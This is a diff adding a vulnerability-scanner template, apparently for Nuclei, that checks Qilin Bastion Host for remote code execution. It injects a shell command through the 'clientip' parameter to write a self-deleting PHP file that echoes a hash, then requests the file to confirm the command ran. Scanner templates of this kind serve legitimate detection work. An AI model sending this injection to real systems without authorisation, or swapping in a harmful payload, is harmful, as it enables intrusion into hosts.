@@ -1,0 +1,33 @@
+id: poc-yaml-qilin-bastion-host-rce
+info:
+  name: Qilin Bastion Host Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: rce
+  description: |
+    Exploits a remote code execution vulnerability in Qilin Bastion Host by writing a PHP script and verifying its execution.
+variables:
+  r2: "{{rand_base(10)}}"
+flow: http(1) && http(2)
+http:
+  - id: "write-php-code"
+    method: GET
+    path:
+      - "/get_luser_by_sshport.php?clientip=1;echo%20\"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>\">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1"
+    matchers:
+      - type: status
+        status:
+          - 200
+  - id: "verify-execution"
+    method: GET
+    path:
+      - "/{{r2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(r2)}}"
